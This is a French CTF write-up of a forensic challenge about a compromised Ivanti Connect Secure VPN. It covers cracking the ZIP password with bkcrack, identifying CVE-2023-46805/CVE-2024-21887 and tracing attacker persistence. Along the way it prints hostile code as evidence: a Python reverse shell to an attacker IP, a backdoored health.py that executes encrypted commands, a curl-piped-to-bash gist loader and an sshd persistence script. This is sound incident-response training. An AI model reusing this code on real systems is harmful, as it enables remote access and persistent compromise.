# Horreur, malheur

## Enoncé 
Vous venez d'être embauché en tant que Responsable de la Sécurité des Systèmes d'Information (RSSI) d'une entreprise stratégique.

En arrivant à votre bureau le premier jour, vous vous rendez compte que votre prédécesseur vous a laissé une clé USB avec une note dessus : `VPN compromis (intégrité). Version 22.3R1 b1647.`

Note : La première partie (Archive chiffrée) débloque les autres parties, à l'exception de la seconde partie (Accès initial) qui peut être traitée indépendamment. Nous vous recommandons de traiter les parties dans l'ordre.

## Partie 1/5
> Sur la clé USB, vous trouvez deux fichiers : une archive chiffrée et les journaux de l'équipement. Vous commencez par lister le contenu de l'archive, dont vous ne connaissez pas le mot de passe. Vous gardez en tête un article que vous avez lu : il paraît que les paquets installés sur l'équipement ne sont pas à jour...

> Le flag est le mot de passe de l'archive.

Pour commencer, listons le contenu de l'archive chiffrée avec `7z l archive.encrypted` :
```
   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2024-03-15 15:58:46 .....        64697        64714  tmp/temp-scanner-archive-20240315-065846.tgz
2022-12-05 17:06:09 .....          194          120  home/VERSION
2024-03-15 15:32:38 .....           33           44  data/flag.txt
------------------- ----- ------------ ------------  ------------------------
2024-03-15 15:58:46              64924        64878  3 files
```

Au vu de l'énoncé, la piste la plus probable semble être une forme de *known plaintext attack*. Par élimination, nous devons donc entrer en possession du fichier `home/VERSION`. Pour ce faire plusieurs solutions :
- Tenter d'obtenir une version d'évaluation du serveur VPN de Ivanti (watch me galérer à travers leur formulaire).
- Faire un google dork intelligent sur `"home/VERSION" ivanti` et tomber sur https://www.assetnote.io/resources/research/high-signal-detection-and-exploitation-of-ivantis-pulse-connect-secure-auth-bypass-rce.

Le site nous révèle le contenu du fichier en guise de POC de la RCE, parfait.
```bash
export DSREL_MAJOR=22
export DSREL_MINOR=3
export DSREL_MAINT=1
export DSREL_DATAVER=4802
export DSREL_PRODUCT=ssl-vpn
export DSREL_DEPS=ive
export DSREL_BUILDNUM=1647
export DSREL_COMMENT="R1"
```

En ajoutant un `\n` à la fin du fichier, on obtient bien une taille de 33 bytes, comme le fichier original.

Il faut maintenant mettre en place l'attaque, à l'aide de l'outil [bkcrack](https://github.com/kimci86/bkcrack). En suivant les instructions, on obtient la commande suivante :
```bash
$ ./bkcrack -C ../archive.encrypted -c "home/VERSION" -P ../VERSION.zip -p "VERSION"
[...]
[19:29:46] Attack on 83134 Z values at index 6
Keys: 6ed5a98a a1bb2e0e c9172a2f
[...]
```

Il suffit maintenant de changer le mot de passe de l'archive : 
```bash
$ ./bkcrack -C ../archive.encrypted -k 6ed5a98a a1bb2e0e c9172a2f -U unlocked.zip 123
```

Enfin, extraire l'archive avec le mot de passe `123` et afficher le flag.

## Partie 2/5
> Sur la clé USB, vous trouvez deux fichiers : une archive chiffrée et les journaux de l'équipement. Vous focalisez maintenant votre attention sur les journaux. L'équipement étant compromis, vous devez retrouver la vulnérabilité utilisée par l'attaquant ainsi que l'adresse IP de ce dernier.

> Le flag est au format : FCSC{CVE-XXXX-XXXXX:\<adresse_IP\>}.

Pour commencer, une simple recherche Google de la version donnée en énoncé nous apprend que le VPN étudié est celui d'Ivanti. Cette version spécifique est vulnérable à deux CVE : CVE-2023-46805 (Auth. Bypass) et CVE-2024-21887 (RCE) (cf. https://www.assetnote.io/resources/research/high-signal-detection-and-exploitation-of-ivantis-pulse-connect-secure-auth-bypass-rce). 

Concernant l'IP utilisée par l'attaquant, il suffit de fouiller un peu dans les logs fournis pour retrouver une commande de reverse-shell python dans le fichier `nodemonlog.old` :
```bash
python -c import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("20.13.3.0",4444));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())
```
On en extrait facilement l'IP `20.13.3.0`.

Il suffit donc de composer les deux possibilités de flag à partir de ces infos.

## Partie 3/5
> Vous avez réussi à déchiffrer l'archive. Il semblerait qu'il y ait dans cette archive une autre archive, qui contient le résultat du script de vérification d'intégrité de l'équipement.

> À l'aide de cette dernière archive et des journaux, vous cherchez maintenant les traces d'une persistance déposée et utilisée par l'attaquant.

Grâce à la première archive décompressée, nous obtenons l'accès à `temp-scanner-archive-20240315-065846.tgz`. Une fois elle-même décompressée, cette archive nous révèle un simple script de config, ainsi qu'un environnement virtuel python. En creusant dans cet environnement, on trouve le fichier `tmp/home/venv3/lib/python3.6/site-packages/cav-0.1-py3.6.egg`. Ce type de fichier est à nouveau décompressable ce qui nous donne accès au code gérant le serveur CAV, dont nous possédons les logs depuis la première étape.

En investigant chacun des scripts, on se rend compte que le fichier `health.py` de l'api est totalement anormal :
```python
#
# Copyright (c) 2018 by Pulse Secure, LLC. All rights reserved
#
import base64
import subprocess
import zlib
import simplejson as json
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import pad, unpad
from flask import request
from flask_restful import Resource


class Health(Resource):
    """
    Handles requests that are coming for client to post the application data.
    """

    def get(self):
        try:
            with open("/data/flag.txt", "r") as handle:
                dskey = handle.read().replace("\n", "")
            data = request.args.get("cmd")                                        # ATTEND UN PARAMETRE CMD DANS LA REQUETE
            if data:
                aes = AES.new(dskey.encode(), AES.MODE_ECB)
                cmd = zlib.decompress(aes.decrypt(base64.b64decode(data)))        # DECODE LE BASE64 PUIS DECHIFFRE AVEC LA CLE AES
                result = subprocess.getoutput(cmd)                                # EXECUTE LA COMMANDE DECHIFREE
                if not isinstance(result, bytes): result = str(result).encode()
                result = base64.b64encode(aes.encrypt(pad(zlib.compress(result), 32))).decode()
                return result, 200                                                # RETOURNE LE RESULTAT DE LA COMMANDE
        except Exception as e:
            return str(e), 501
```

Pour retrouver les commandes executées par l'attaquant, il faut donc patcher ce script pour afficher les commandes et retrouver dans le fichier de log `cav_webserv.log` chaque occurence du paramètre `?cmd=`.

```python
import base64
import zlib
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import pad, unpad

dskey = "50c53be3eece1dd551bebffe0dd5535c"
data = "/ppF2z0iUCf0EHGFPBpFW6pWT4v/neJ6wP6dERUuBM/6CAV2hl/l4o7KqS7TvTZAWDVxqTd6EansrCTOAnAwdQ=="

if data:
    aes = AES.new(dskey.encode(), AES.MODE_ECB)
    cmd = zlib.decompress(aes.decrypt(base64.b64decode(data)))
    print(cmd)
```

En décodant successivement, on obtient :
```bash
id
ls /
echo FCSC{REDACTED}
[...]
```

## Partie 4/5
> Vous remarquez qu'une fonctionnalité built-in de votre équipement ne fonctionne plus et vous vous demandez si l'attaquant n'a pas utilisé la première persistance pour en installer une seconde, moins "visible"...

> Vous cherchez les caractéristiques de cette seconde persistance : protocole utilisé, port utilisé, chemin vers le fichier de configuration qui a été modifié, chemin vers le fichier qui a été modifié afin d'établir la persistance.

> Le flag est au format : FCSC{\<protocole\>:\<port\>:\<chemin_absolu\>:\<chemin_absolu\>}.

En continuant de déchiffrer chaque occurence, on obtient ensuite : 
```bash
/home/bin/curl -k -s https://api.github.com/repos/joke-finished/2e18773e7735910db0e1ad9fc2a100a4/commits?per_page=50 -o /tmp/a'
cat /tmp/a | grep "name" | /pkg/uniq | cut -d ":" -f 2 | cut -d \'"\' -f 2 | tr -d \'\n\' | grep -o . | tac | tr -d \'\n\'  > /tmp/b
a=`cat /tmp/b`;b=${a:4:32};c="https://api.github.com/gists/${b}";/home/bin/curl -k -s ${c} | grep \'raw_url\' | cut -d \'"\' -f 4 > /tmp/c
c=`cat /tmp/c`;/home/bin/curl -k ${c} -s | bash
rm /tmp/a /tmp/b /tmp/c
nc 146.0.228.66:1337
```

Après désobfuscation, les commandes exécutent en réalité script suivant :
```bash
sed -i 's/port 830/port 1337/' /data/runtime/etc/ssh/sshd_server_config > /dev/null 2>&1
sed -i 's/ForceCommand/#ForceCommand/' /data/runtime/etc/ssh/sshd_server_config > /dev/null 2>&1
echo "PubkeyAuthentication yes" >> /data/runtime/etc/ssh/sshd_server_config
echo "AuthorizedKeysFile /data/runtime/etc/ssh/ssh_host_rsa_key.pub" >> /data/runtime/etc/ssh/sshd_server_config
pkill sshd-ive > /dev/null 2>&1
gzip -d /data/pkg/data-backup.tgz > /dev/null 2>&1
tar -rf /data/pkg/data-backup.tar /data/runtime/etc/ssh/sshd_server_config > /dev/null 2>&1
gzip /data/pkg/data-backup.tar > /dev/null 2>&1
mv /data/pkg/data-backup.tar.gz /data/pkg/data-backup.tgz > /dev/null 2>&1
```

Nous avons donc tout ce qu'il est nécessaire de connaître : le port (1337), le protocole (SSH), le fichier de config (sshd_server_config) et le fichier modifié pour la persistance (data-backup.tgz).

## Partie 5/5
> Vous avez presque fini votre analyse ! Il ne vous reste plus qu'à qualifier l'adresse IP présente dans la dernière commande utilisée par l'attaquant.

> Vous devez déterminer à quel groupe d'attaquant appartient cette adresse IP ainsi que l'interface de gestion légitime qui était exposée sur cette adresse IP au moment de l'attaque.

> Le flag est au format : FCSC{\<UNCXXXX\>:\<nom du service\>}.

> Remarque : Il s'agit d'une véritable adresse IP malveillante, n’interagissez pas directement avec cette adresse IP.
